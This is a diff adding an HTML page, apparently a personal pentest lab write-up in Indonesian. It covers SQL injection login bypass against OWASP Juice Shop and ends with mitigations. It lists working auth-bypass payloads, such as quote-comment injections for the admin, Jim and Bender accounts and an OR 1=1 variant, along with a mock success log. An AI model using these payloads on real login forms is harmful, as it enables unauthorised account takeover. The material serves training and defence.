@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>SQLi Write-up · Bypass Login (admin, Jim, Bender) | Catatan Pentest</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #3b82f6;
+            --accent-yellow: #facc15;
+            --accent-gold: #eab308;
+            --bg-dark: #0a0a0f;
+            --surface-dark: #12121a;
+            --surface-elevated: #1e1e2a;
+            --text-light: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border-dim: #2d2d3a;
+            --sql-danger: #f97316;
+            --sql-comment: #6ee7b7;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.55;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: var(--accent-yellow);
+            text-decoration: underline;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            color: var(--accent-yellow);
+            letter-spacing: -0.3px;
+        }
+
+        .meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--border-dim);
+            font-size: 0.9rem;
+        }
+
+        .meta i {
+            margin-right: 0.3rem;
+            width: 1.1rem;
+        }
+
+        h2 {
+            margin: 1.8rem 0 0.8rem;
+            color: var(--primary-blue);
+            font-weight: 600;
+            font-size: 1.5rem;
+            border-left: 4px solid var(--accent-gold);
+            padding-left: 0.8rem;
+        }
+
+        h3 {
+            margin: 1.2rem 0 0.6rem;
+            color: var(--text-light);
+            font-weight: 600;
+            font-size: 1.25rem;
+        }
+
+        p {
+            margin: 0.8rem 0;
+        }
+
+        ul, ol {
+            margin: 0.6rem 0 0.8rem 1.5rem;
+        }
+
+        li {
+            margin: 0.4rem 0;
+        }
+
+        code {
+            background: var(--surface-elevated);
+            padding: 0.2rem 0.45rem;
+            border-radius: 6px;
+            font-family: 'Fira Code', 'Cascadia Code', monospace;
+            font-size: 0.9em;
+            color: var(--accent-yellow);
+            word-break: break-word;
+        }
+
+        pre {
+            background: var(--surface-elevated);
+            padding: 1rem;
+            border-radius: 0.9rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            border: 1px solid var(--border-dim);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+        }
+
+        .mock-data {
+            background: var(--surface-dark);
+            padding: 1rem 1.2rem;
+            border-radius: 1rem;
+            border-left: 5px solid var(--accent-yellow);
+            margin: 1.6rem 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+
+        .payload-card {
+            background: var(--surface-elevated);
+            border-radius: 1rem;
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            border: 1px solid rgba(250, 204, 21, 0.2);
+            transition: all 0.1s ease;
+        }
+
+        .payload-card strong {
+            color: var(--accent-yellow);
+        }
+
+        .badge {
+            display: inline-block;
+            background: #3b82f620;
+            color: var(--primary-blue);
+            font-size: 0.7rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            margin-right: 0.5rem;
+            font-weight: 500;
+        }
+
+        .sql-icon {
+            color: var(--sql-danger);
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.8rem;
+            border-top: 1px solid var(--border-dim);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        hr {
+            border: none;
+            height: 1px;
+            background: var(--border-dim);
+            margin: 1.5rem 0;
+        }
+
+        @media (max-width: 720px) {
+            .container { padding: 1.2rem; }
+            h1 { font-size: 1.6rem; }
+            pre { font-size: 0.75rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <a href="../modules.html" class="back-link"><i class="fas fa-arrow-left"></i> Kembali ke Modul</a>
+    <h1><i class="fas fa-terminal sql-icon"></i> SQL Injection: Bypass Login</h1>
+    <div class="meta">
+        <span><i class="far fa-calendar-alt"></i> Notion Export · 24 April 2026</span>
+        <span><i class="fas fa-database"></i> #SQLi #AuthBypass</span>
+        <span><i class="fas fa-user-secret"></i> Manual injection · browser only</span>
+        <span><i class="fas fa-tag"></i> OWASP Top 10: A03:2021</span>
+    </div>
+
+    <p><strong>Ringkasan eksekutif:</strong> Berdasarkan eksperimen pada aplikasi vulnerable (Juice Shop / platform serupa), berhasil melakukan <strong>login bypass</strong> untuk akun <code>admin</code>, <code>Jim</code>, dan <code>Bender</code> hanya menggunakan <strong>form login browser</strong> + teknik SQL injection. Tidak diperlukan tool otomatis — hanya karakter <code>'</code> , <code>OR 1=1</code> dan <code>--</code> (komentar SQL). Berikut rincian metode & payload yang digunakan.</p>
+
+    <!-- Admin section -->
+    <h2><i class="fas fa-crown"></i> 1. Admin — Bypass total & privilege escalation</h2>
+    <p>Target pertama adalah akun administrator. Melalui <strong>reconnaissance pasif</strong> (membaca komentar/review pada halaman produk) ditemukan email admin: <code>admin@juice-sh.op</code>. Dengan celah injeksi SQL pada parameter <strong>email</strong>, login dapat dipalsukan.</p>
+
+    <div class="payload-card">
+        <strong><i class="fas fa-code"></i> PAYLOAD #1 (specific email)</strong>
+        <pre style="margin: 0.7rem 0 0 0; background:#0f0f17;"><code>admin@juice-sh.op' --</code></pre>
+        <small><i class="fas fa-check-circle" style="color:#10b981;"></i> <strong>Hasil:</strong> berhasil login sebagai admin tanpa password. Query SQL diabaikan dari tanda <code>--</code> ke belakang.</small>
+    </div>
+
+    <div class="payload-card">
+        <strong><i class="fas fa-shield-alt"></i> PAYLOAD #2 (blind universal / OR 1=1)</strong>
+        <pre style="margin: 0.7rem 0 0 0; background:#0f0f17;"><code>penghoetank' OR 1=1 --</code></pre>
+        <small><i class="fas fa-check-circle" style="color:#10b981;"></i> <strong>Hasil:</strong> kondisi <code>OR 1=1</code> selalu bernilai TRUE, database mengembalikan user pertama (biasanya admin) dan login sukses. Apapun string sebelum <code>'</code> tidak penting.</small>
+    </div>
+
+    <h3>📖 Penjelasan teknis (mekanisme injeksi)</h3>
+    <p>Aplikasi rentan karena menyusun query SQL secara dinamis tanpa prepared statement. Kira-kira bentuk asli query:</p>
+    <pre><code>SELECT * FROM users WHERE email = '$email' AND password = '$password'</code></pre>
+    <p>Dengan injeksi payload <code>admin@juice-sh.op' --</code> , ekspresi berubah menjadi:</p>
+    <pre><code>SELECT * FROM users WHERE email = 'admin@juice-sh.op' -- ' AND password = 'anything'</code></pre>
+    <p>Karakter <code>--</code> (double dash + spasi) mengomentari sisa query, sehingga password diabaikan. Untuk payload <code>penghoetank' OR 1=1 --</code>, kondisi menjadi:</p>
+    <pre><code>SELECT * FROM users WHERE email = 'penghoetank' OR 1=1 -- ' AND password = '...'</code></pre>
+    <p>Karena <code>1=1</code> bernilai benar, query mengambil semua baris, lalu aplikasi biasanya memakai data baris pertama → <strong>admin</strong>.</p>
+
+    <div class="mock-data">
+        <i class="fas fa-chart-line"></i> <strong>Mock log keberhasilan (dari percobaan langsung):</strong>
+        <pre>=========================================
+[+] Target: Login Portal
+[+] Parameter rentan: email
+[+] Payload diterapkan: admin@juice-sh.op' --
+[+] Server response: HTTP 302 Redirect → /dashboard
+[+] Role yang didapat: Administrator (full privilege)
+[+] Metode alternatif: penghoetank' OR 1=1 -- → SUKSES
+=========================================</pre>
+    </div>
+
+    <!-- Other users: Jim & Bender -->
+    <h2><i class="fas fa-users"></i> 2. Akun lain: Jim & Bender (manual bypass)</h2>
+    <p>Prinsip serupa digunakan untuk pengguna <strong>Jim</strong> dan <strong>Bender</strong>. Langkah pertama: <strong>menemukan alamat email mereka</strong> yang terdaftar di sistem (biasanya melalui halaman profil publik, komentar, atau daftar user yang terekspos). Setelah mendapatkan email spesifik, injeksi dengan <code>' --</code> langsung berhasil.</p>
+
+    <h3>🎯 Login sebagai Jim</h3>
+    <div class="payload-card">
+        <pre><code>jim@juice-sh.op' --</code></pre>
+        <span class="badge">email ditemukan</span> <span class="badge">bypass password</span>
+        <p><i class="fas fa-key"></i> <strong>Cara:</strong> masukkan email tersebut ke field login, lalu tambahkan kutip tunggal dan spasi + <code>--</code>. Biarkan password kosong / sembarang. Login sukses mengakses akun Jim.</p>
+    </div>
+
+    <h3>🤖 Login sebagai Bender</h3>
+    <div class="payload-card">
+        <pre><code>bender@juice-sh.op' --</code></pre>
+        <span class="badge">email diketahui</span> <span class="badge">bypass auth</span>
+        <p>Teknik identik: <code>bender@juice-sh.op' --</code> akan mengabaikan verifikasi password dan langsung login sebagai Bender.</p>
+    </div>
+
+    <h3>📌 Mengapa teknik ini bekerja?</h3>
+    <ul>
+        <li>Backend tidak melakukan escaping/parameterisasi pada input email.</li>
+        <li>Simbol <code>'</code> menutup string SQL, lalu <code>--</code> menjadikan sisa query sebagai komentar (termasuk klausa password).</li>
+        <li>Database akan mencocokkan email yang valid, dan tidak peduli dengan nilai password karena sudah dikomentari.</li>
+        <li>Ini merupakan <strong>classic tautological injection</strong> pada mekanisme login.</li>
+    </ul>
+
+    <h2><i class="fas fa-lightbulb"></i> Insight & Catatan Pribadi</h2>
+    <div class="mock-data">
+        <i class="fas fa-pen-fancy"></i> <strong>Hasil observasi lapangan:</strong><br>
+        • Metode <code>OR 1=1</code> sangat efektif untuk blind attack ketika kita tidak tahu email admin sekalipun.<br>
+        • Untuk user Jim & Bender, enumerasi email sangat kritis. Sumber: daftar komentar publik, fitur "forgot password" yang leak info, atau galeri user.<br>
+        • Seluruh percobaan dilakukan <strong>hanya menggunakan browser (developer tools tidak wajib)</strong>, cukup ubah input field.<br>
+        • Penting: setelah sukses login, kita bisa mengeksplorasi data sensitif, mengubah hak akses (post-exploitation).<br>
+        • Pada versi aplikasi yang sudah di-patch, serangan gagal — menekankan pentingnya sanitasi input serta <strong>parameterized queries</strong>.
+    </div>
+
+    <hr>
+
+    <h2><i class="fas fa-clipboard-list"></i> Tabel ringkasan payload</h2>
+    <div style="overflow-x: auto;">
+        <table style="width:100%; border-collapse: collapse; background: var(--surface-dark); border-radius: 1rem; overflow: hidden;">
+            <thead style="background: #1e1e2a;">
+                <tr><th style="padding: 12px; text-align: left;">Target Akun</th><th style="padding: 12px; text-align: left;">Payload SQL</th><th style="padding: 12px; text-align: left;">Status</th></tr>
+            </thead>
+            <tbody>
+                <tr style="border-bottom: 1px solid var(--border-dim);"><td style="padding: 10px;">admin</td><td style="padding: 10px;"><code>admin@juice-sh.op' --</code></td><td style="padding: 10px; color:#4ade80;">✅ login sukses</td></tr>
+                <tr style="border-bottom: 1px solid var(--border-dim);"><td style="padding: 10px;">admin</td><td style="padding: 10px;"><code>penghoetank' OR 1=1 --</code></td><td style="padding: 10px; color:#4ade80;">✅ bypass admin (first user)</td></tr>
+                <tr style="border-bottom: 1px solid var(--border-dim);"><td style="padding: 10px;">Jim</td><td style="padding: 10px;"><code>jim@juice-sh.op' --</code></td><td style="padding: 10px; color:#4ade80;">✅ akses penuh akun Jim</td></tr>
+                <tr><td style="padding: 10px;">Bender</td><td style="padding: 10px;"><code>bender@juice-sh.op' --</code></td><td style="padding: 10px; color:#4ade80;">✅ akses penuh akun Bender</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2><i class="fas fa-shield-virus"></i> Refleksi keamanan (mitigasi)</h2>
+    <ul>
+        <li><strong>Prepared statements / ORM</strong> – tidak ada lagi concatenation query string.</li>
+        <li><strong>Validasi input ketat</strong> – filter karakter seperti <code>'</code>, <code>--</code>, dan <code>OR 1=1</code> di sisi server.</li>
+        <li><strong>WAF (Web Application Firewall)</strong> – dapat mendeteksi pola SQLi sederhana.</li>
+        <li><strong>Least privilege database</strong> – akun aplikasi hanya memiliki akses terbatas.</li>
+    </ul>
+
+    <div class="mock-data">
+        <i class="fas fa-dragon"></i> <strong>Ekstra catatan lab:</strong><br>
+        "Walaupun terlihat sederhana, SQL injection masih menjadi momok di tahun 2025+ karena kesalahan implementasi legacy. Selalu uji penetrasi terhadap formulir login." — <em>Catatan pribadi / Notion</em>
+    </div>
+
+    <h2><i class="fas fa-book-open"></i> Referensi & tools bantu</h2>
+    <ul>
+        <li>OWASP SQL Injection Prevention Cheat Sheet</li>
+        <li>PayloadsAllTheThings — SQL injection (Auth bypass)</li>
+        <li>Manual testing: <code>' OR 1=1 --</code>, <code>admin' --</code> variations</li>
+        <li>Lingkungan uji: OWASP Juice Shop / VulnWeb</li>
+    </ul>
+
+    <footer>
+        <i class="fas fa-flask"></i> Notion → HTML conversion | Maulana Rizki Ramadhan — ethical hacking notes<br>
+        <span style="font-size: 0.75rem;">#sqli #pentest #bypassLogin | hanya digunakan untuk pembelajaran & pengujian terotorisasi</span>
+    </footer>
+</div>
+
+<!-- optional: smooth back link -->
+<script>
+    document.getElementById('homeMockLink')?.addEventListener('click', (e) => {
+        e.preventDefault();
+        if(confirm('Halaman ini adalah catatan SQL injection dari Notion. Klik OK untuk tetap di halaman atau Batal jika ada navigasi.')){
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    });
+</script>
+</body>
+</html>
